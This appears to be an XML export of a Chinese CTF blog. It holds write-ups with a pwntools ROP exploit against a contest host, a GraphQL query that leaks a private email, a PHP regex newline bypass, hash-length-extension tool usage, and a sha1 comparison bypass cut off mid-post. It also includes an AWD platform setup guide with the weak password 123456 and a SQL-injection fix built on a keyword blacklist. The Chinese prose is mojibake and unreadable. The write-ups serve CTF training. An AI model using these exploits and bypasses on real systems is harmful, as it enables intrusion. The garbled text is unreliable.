class="hljs-string">&#x27;:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,<br>	<span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span><br>&#125;<br>	<span class="hljs-built_in">print</span> headers<br>	re=requests.get(url=url,headers=headers)<br>	<span class="hljs-built_in">print</span> re.text<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Welcome&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>		<span class="hljs-built_in">print</span> re;<br>		<span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">ä½¿ç”¨è¯´æ˜<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> hashpumpy<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">help</span>(hashpumpy.hashpump)<br>Help on built-<span class="hljs-keyword">in</span> function hashpump <span class="hljs-keyword">in</span> module hashpumpy:<br>hashpump(...)<br>    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)<br>    Arguments:<br>        hexdigest(<span class="hljs-built_in">str</span>):      Hex-encoded result of hashing key + original_data.<br>        original_data(<span class="hljs-built_in">str</span>):  Known data used to get the <span class="hljs-built_in">hash</span> result hexdigest.<br>        data_to_add(<span class="hljs-built_in">str</span>):    Data to append<br>        key_length(<span class="hljs-built_in">int</span>):     Length of unknown data prepended to the <span class="hljs-built_in">hash</span><br>    Returns:<br>        A <span class="hljs-built_in">tuple</span> containing the new <span class="hljs-built_in">hex</span> digest <span class="hljs-keyword">and</span> the new message.<br><span class="hljs-meta">&gt;&gt;&gt; </span>hashpumpy.hashpump(<span class="hljs-string">&#x27;ffffffff&#x27;</span>, <span class="hljs-string">&#x27;original_data&#x27;</span>, <span class="hljs-string">&#x27;data_to_add&#x27;</span>, <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;KEYKEYKEY&#x27;</span>))<br>(<span class="hljs-string">&#x27;e3c4a05f&#x27;</span>, <span class="hljs-string">&#x27;original_datadata_to_add&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>hash</tag>
        <tag>ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackergame 2021-å›¾ä¹‹ä¸Šçš„ä¿¡æ¯-wp</title>
    <url>/posts/f5b82e4/</url>
    <content><![CDATA[<h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>å° T å¬è¯´ GraphQL æ˜¯ä¸€ç§ç‰¹åˆ«çš„ API è®¾è®¡æ¨¡å¼ï¼Œä¹Ÿæ˜¯ RESTful API çš„æœ‰åŠ›ç«äº‰è€…ï¼Œæ‰€ä»¥ä»–å†™äº†ä¸ªå°ç½‘ç«™æ¥å®éªŒè¿™é¡¹æŠ€æœ¯ã€‚<br>ä½ èƒ½é€šè¿‡è¿™ä¸ªå…¨æ–°çš„æ¥å£ï¼Œè·å–åˆ°æ²¡æœ‰å…¬å¼€å‡ºæ¥çš„ç®¡ç†å‘˜çš„é‚®ç®±åœ°å€å—ï¼Ÿ</p>
<h1 id="èµ„æ–™"><a href="#èµ„æ–™" class="headerlink" title="èµ„æ–™"></a>èµ„æ–™</h1><p>è°·æ­Œæ‰¾åˆ°çš„ä¸€ç¯‡<a href="https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/">æ–‡ç« </a><br>æŸ¥æ‰€æœ‰å¯ç”¨çš„å­—æ®µ<br><img src="/img/wp/2021/2021hackergame-1.png"></p>
<h1 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h1><p>å…ˆguest&#x2F;guestç™»é™†<br>ç„¶ååœ¨<code>/graphql</code>æ¥å£ä¸­æŸ¥åˆ°éœ€è¦çš„emailå­—æ®µ<br><img src="/img/wp/2021/2021hackergame-2.png"></p>
<p>æœ€åæŸ¥è¯¢ <code>&#123;&quot;query&quot;:&quot;&#123; user(id:1) &#123; privateEmail &#125;&#125;&quot;&#125;</code> å³å¯å¾—åˆ° flagã€‚<br><img src="/img/wp/2021/2021hackergame-3.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>GraphQL</tag>
        <tag>hackergame</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å››å±Šæµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›å†³èµ›-WP</title>
    <url>/posts/8bf1ff96/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="è¿œå¤ç‰¹æ€§"><a href="#è¿œå¤ç‰¹æ€§" class="headerlink" title="è¿œå¤ç‰¹æ€§"></a>è¿œå¤ç‰¹æ€§</h2><p>webç­¾åˆ°é¢˜ï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Present from glzjin :)</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^hint\/hint.txt$/m&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try again!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯ç¬¦åˆæ¡ä»¶<code>hint/hint.txt</code>åæ¢è¡Œç›´æ¥è¯»å–æ–‡ä»¶ï¼Œ<code>%0a</code>ç»•è¿‡</p>
<p><img src="/img/wp/2021/2021zhejiang-1.png"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="sai-easy"><a href="#sai-easy" class="headerlink" title="sai_easy"></a>sai_easy</h2><p>pwnç­¾åˆ°é¢˜<br>åˆ†ææ–‡ä»¶</p>
<p><img src="/img/wp/2021/2021zhejiang-2.png"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;sai_easy_pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;</span>,<span class="hljs-number">53100</span>)<br>str_bin=<span class="hljs-number">0x601098</span><br>sys_add=<span class="hljs-number">0x400760</span><br>pop_rdi=<span class="hljs-number">0x0000000000400b23</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(str_bin)+p64(sys_add))</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x40098e</span>))<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x30)</span><br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x8+p64(sys_add)+p64(0x6010e0)+p64(pop_rdi)+p64(str_bin)+p64(0x0000000000400aa4))</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="preprocess"><a href="#preprocess" class="headerlink" title="preprocess"></a>preprocess</h2><p>é€šè¿‡å¯¹cæ–‡ä»¶çš„åˆ†æå‘ç°å®é™…ä¸Šæœ‰ä¸€ç§ç±»ä¼¼base64çš„æ•ˆæœ<br>å°†å­—ç¬¦ä¸²æ¯ä¸‰ä¸ªå­—èŠ‚æŒ‰ç…§å…­ä½ä¸€ç»„è¿›è¡Œåˆ†éš”<br>å…ˆè¿›è¡Œå–å<br>ç„¶åå¯¹è¿™å…­ä½äºŒè¿›åˆ¶è¿›è¡Œæ¢ä½æ“ä½œ<br>ç„¶åè¿›è¡Œå¯¹ç…§ å¦‚æœä¸ç›¸åŒç¼–è¯‘æ—¶å°±ä¼šæŠ¥é”™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br><span class="hljs-keyword">import</span> re<br>d=f.read()<br>e=re.findall(<span class="hljs-string">&#x27; \^ (.+)&#x27;</span>,d)<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    cache=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">if</span> cache[j]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>            data+=<span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            data+=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(data)<br>flag=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper())<br><span class="hljs-built_in">print</span>(base64.b16decode(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper().strip(<span class="hljs-string">&#x27;L&#x27;</span>)))<br></code></pre></td></tr></table></figure>

<h2 id="æœ€ç®€å•çš„é€†å‘"><a href="#æœ€ç®€å•çš„é€†å‘" class="headerlink" title="æœ€ç®€å•çš„é€†å‘"></a>æœ€ç®€å•çš„é€†å‘</h2><p>åˆ†ææ–‡ä»¶</p>
<p><img src="/img/wp/2021/2021zhejiang-3.png"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=[chr(<span class="hljs-number">0</span>x76-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x73-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x85-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x75-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x86-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x78-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAD-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x66-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAF-<span class="hljs-number">50</span>)]<br><span class="hljs-attribute">print</span>(&#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2021/2021zhejiang-4.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h2><p>ç®€å•çš„baseåµŒå¥—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>b1=base64.b64decode<br>b2=base64.b32decode<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decode_and_decode.txt&#x27;</span>)<br>f=f.read()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        f=base64.b16decode(f)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f=base64.b32decode(f)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">try</span>:<br>                f=base64.b64decode(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(f)<br></code></pre></td></tr></table></figure>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h2><p>ä»pdfä¸­å¾—åˆ°åå­—å’Œç”Ÿæ—¥ï¼Œäº’ç›¸ç»„åˆä¸€ä¸‹</p>
<p><img src="/img/wp/2021/2021zhejiang-5.png"></p>
<p>å¯†ç ä¸ºå‘æ™š0612</p>
<h2 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h2><p>åˆ†ææ–‡ä»¶å‘ç°evil.phpæ–‡ä»¶æ¯”è¾ƒå¯ç–‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;my_site.log&#x27;</span>)<br>d=f.readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;evil.php&#x27;</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨è„šæœ¬è·å–evil.phpæ–‡ä»¶çš„æ—¥å¿—</p>
<p><img src="/img/wp/2021/2021zhejiang-6.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">45</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">50</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">73</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)]))<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2021/2021zhejiang-7.png"></p>
<p>å¯†ç ä¸ºhehehe233_Igotroot</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021</tag>
        <tag>æµ™æ±Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>Cardinalå¹³å°éƒ¨ç½²</title>
    <url>/posts/f7d25d2e/</url>
    <content><![CDATA[<h1 id="ç¯å¢ƒè¦æ±‚"><a href="#ç¯å¢ƒè¦æ±‚" class="headerlink" title="ç¯å¢ƒè¦æ±‚"></a>ç¯å¢ƒè¦æ±‚</h1><p>å¦‚æœæ˜¯å›¢é˜Ÿå†…éƒ¨å±€åŸŸç½‘æ¯”èµ›ä¸€ä¸ªè™šæ‹Ÿæœºå°±å¤Ÿç”¨äº†ï¼Œç”šè‡³é¶æœºéƒ½å¯ä»¥éƒ¨ç½²åœ¨åŒä¸€å°ä¸Šï¼Œæ–‡ä¸­è™šæ‹Ÿæœºä¸ºcentos7<br>å¹³å°æœ¬èº«å¯ä»¥ä¸éœ€è¦dockerï¼Œä½†é¶æœºå¤§éƒ¨åˆ†éœ€è¦dockerç¯å¢ƒï¼Œæ–‡ä¸­dockerç‰ˆæœ¬ä¸º20.10.9<br>è¿˜éœ€è¦æœ‰ä¸€ä¸ªæ•°æ®åº“æ¥å­˜æ•°æ®ï¼Œè¿™é‡Œç”¨åˆ°æ˜¯mysql</p>
<h1 id="å®‰è£…mysql"><a href="#å®‰è£…mysql" class="headerlink" title="å®‰è£…mysql"></a>å®‰è£…mysql</h1><p>å®‰è£…mysql<br><code>yum -y install mariadb-server mariadb</code><br>è®¾ç½®mysqlå¼€æœºè‡ªå¯åŠ¨å’Œå¯åŠ¨mysql<br><code>systemctl start mariadb &amp;&amp; systemctl enable mariadb</code><br>è®¾ç½®mysql rootç”¨æˆ·å¯†ç <br><code>mysqladmin -u root password 123456</code><br>è¿›å…¥æ•°æ®åº“<br><code>mysql -u root -p123456</code><br>åˆ›å»ºæ•°æ®åº“ï¼Œæ³¨æ„ç¼–ç <br><code>create database `cardinal` default character set utf8mb4 collate utf8mb4_unicode_ci;</code></p>
<h1 id="å®‰è£…Cardinal"><a href="#å®‰è£…Cardinal" class="headerlink" title="å®‰è£…Cardinal"></a>å®‰è£…Cardinal</h1><p>é¦–å…ˆ<a href="https://github.com/vidar-team/Cardinal/releases">ä¸‹è½½</a>å¯¹åº”çš„å®‰è£…åŒ…<br><img src="/img/awd/Cardinal-2.jpg"></p>
<p>è§£å‹<br><code>tar -zxvf Cardinal_v0.7.3_linux_amd64.tar.gz</code><br><img src="/img/awd/Cardinal-3.jpg"></p>
<p>è¿è¡Œ<br><code>./Cardinal</code><br>å¦‚æœæ²¡æœ‰æƒé™éœ€è¦æ·»åŠ æ‰§è¡Œæƒé™<code>chmod +x ./Cardinal</code></p>
<h1 id="Cardinalé…ç½®"><a href="#Cardinalé…ç½®" class="headerlink" title="Cardinalé…ç½®"></a>Cardinalé…ç½®</h1><p>æ ¹æ®æç¤ºæ¥å³å¯<br><img src="/img/awd/Cardinal-4.jpg"></p>
<p>ç®¡ç†åœ°å€<br><code>http://ip:port/manager/</code></p>
<h1 id="é¶æœºé…ç½®"><a href="#é¶æœºé…ç½®" class="headerlink" title="é¶æœºé…ç½®"></a>é¶æœºé…ç½®</h1><p>æ‰¾ä¸ªdocker-awdé¶æœº<br>è¿™é‡Œä»¥<code>glzjin/20190511_awd_docker_b4</code>ä¸ºä¾‹å­</p>
<p>ä¸‹è½½é¶æœº<br><code>docker pull glzjin/20190511_awd_docker_b4</code><br><img src="/img/awd/Cardinal-5.jpg"></p>
<p>ä»¥ä¸‰ä¸ªé˜Ÿä¼ï¼ˆlewiserii,rot,whatisupï¼‰ä¸ºä¾‹<br>åˆ›å»ºä¸‰ä¸ªé¶æœº<br>åˆ†åˆ«å¼€æ”¾80å’Œ22ç«¯å£<br><img src="/img/awd/Cardinal-6.jpg"></p>
<h1 id="æ¯”èµ›å‰é¢˜ç›®é…ç½®"><a href="#æ¯”èµ›å‰é¢˜ç›®é…ç½®" class="headerlink" title="æ¯”èµ›å‰é¢˜ç›®é…ç½®"></a>æ¯”èµ›å‰é¢˜ç›®é…ç½®</h1><p>å…ˆæ·»åŠ ä¸‰ä¸ªé˜Ÿä¼<br><img src="/img/awd/Cardinal-7.jpg"></p>
<p>åˆ›å»ºé¢˜ç›®<br><img src="/img/awd/Cardinal-8.jpg"></p>
<p>æ·»åŠ é¶æœºï¼Œæ³¨æ„sshæ˜¯rootï¼Œå› ä¸ºæ²¡æƒé™ä¼šå†™ä¸è¿›flag<br><img src="/img/awd/Cardinal-9.jpg"></p>
<p>ç”Ÿæˆflag<br><img src="/img/awd/Cardinal-10.jpg"></p>
<p>æ›´æ”¹é¶æœºrootå¯†ç <br><img src="/img/awd/Cardinal-11.jpg"></p>
<p>å†™å…¥flagå’ŒéªŒè¯é¶æœº<br><img src="/img/awd/Cardinal-12.jpg"></p>
<h1 id="å¼€å§‹æ¯”èµ›"><a href="#å¼€å§‹æ¯”èµ›" class="headerlink" title="å¼€å§‹æ¯”èµ›"></a>å¼€å§‹æ¯”èµ›</h1><p>é€‰æ‰‹ç”¨äº‹å…ˆå®šä¹‰çš„è´¦å·å¯†ç ç™»å½•<code>http://ip:port</code>å³å¯<br><img src="/img/awd/Cardinal-13.png"></p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€buuctfã€‘åŠ å›ºé¢˜-Ezsql</title>
    <url>/posts/b7823512/</url>
    <content><![CDATA[<p>ç¬¬ä¸€æ¬¡åšåˆ°è¿™ç§ç±»å‹çš„é¢˜ç›®ï¼ŒæŒºæœ‰æ„æ€çš„</p>
<h1 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h1><p>é¦–å…ˆsshè¿ä¸Šé¶æœº<br><img src="/img/buuctf/Ezsql-1.jpg"></p>
<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><p>è¿›å…¥ç½‘ç«™æ ¹ç›®å½•<code>/var/www/html</code><br><img src="/img/buuctf/Ezsql-2.jpg"></p>
<p>æŸ¥çœ‹<code>dbConnect.php</code><br>å‘ç°åªæ˜¯è¿æ¥æ•°æ®åº“çš„<br><img src="/img/buuctf/Ezsql-3.jpg"></p>
<p>å†çœ‹<code>index.php</code><br>çœ‹åˆ°æ ¸å¿ƒä»£ç æ²¡æœ‰ä»»ä½•è¿‡æ»¤<br><img src="/img/buuctf/Ezsql-4.jpg"></p>
<h1 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h1><h2 id="addslasheså‡½æ•°"><a href="#addslasheså‡½æ•°" class="headerlink" title="addslasheså‡½æ•°"></a>addslasheså‡½æ•°</h2><p><code>addslashes($string)</code>ï¼šç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦â€™ â€œ \</p>
<h2 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h2><p>å°†usernameå’Œpasswordå¤„ç†ä¸€ä¸‹<br><img src="/img/buuctf/Ezsql-5.jpg"></p>
<h1 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h1><h2 id="é»‘åå•æ›¿æ¢"><a href="#é»‘åå•æ›¿æ¢" class="headerlink" title="é»‘åå•æ›¿æ¢"></a>é»‘åå•æ›¿æ¢</h2><p>è®¾ç½®ä¸€ä¸ªé»‘åå•<br><code>$blacklist = [&quot;&gt;&quot;,&quot;;&quot;,&quot;|&quot;,&quot;union&quot;,&quot;select&quot;,&quot;or&quot;,&quot;#&quot;,&quot;--+&quot;,&quot;%&quot;,&quot;&#39;&quot;,&quot; &quot;];</code></p>
<h2 id="é˜²æŠ¤-1"><a href="#é˜²æŠ¤-1" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h2><p><code>$username = str_replace($blacklist,&quot;&quot;,$username);</code><br><code>$password = str_replace($blacklist,&quot;&quot;,$password);</code></p>
<h1 id="check"><a href="#check" class="headerlink" title="check"></a>check</h1><p>æ£€æµ‹é€šè¿‡<br><img src="/img/buuctf/Ezsql-6.jpg"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
        <tag>sql</tag>
        <tag>fix</tag>
      </tags>
  </entry>
  <entry>
    <title>sha1å¼ºæ¯”è¾ƒç»•è¿‡</title>
    <url>/posts/5da2ae7c/</url>
    <content><![CDATA[<h1 id="ä¾‹1"><a href="#ä¾‹1" class="headerlink" title="ä¾‹1"></a>ä¾‹1</h1><p>åªåˆ¤æ–­ä¸¤ä¸ªå€¼ä¸èƒ½ç›¸ç­‰çš„æƒ…å†µ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;welcome&#x27;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span 